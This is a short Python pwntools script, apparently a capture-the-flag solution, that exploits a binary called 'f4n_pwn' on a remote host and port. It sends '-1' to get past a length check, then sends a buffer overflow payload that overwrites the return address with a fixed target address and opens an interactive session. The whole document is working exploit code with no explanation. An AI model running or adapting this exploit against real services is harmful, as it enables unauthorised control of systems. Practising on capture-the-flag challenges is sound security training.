from pwn import *
context.log_level = 'debug'
p = process("./f4n_pwn")
p = remote("114.116.54.89", "10011")
target = 0x080486BB
p.recvuntil(":")
payload = 'a' * 0x50  + p32(0xffffffff)+p32(0x54)+'\xff'*12
payload += p32(target)
p.sendline('-1')
p.recvuntil(":")

p.sendline(payload)
p.interactive()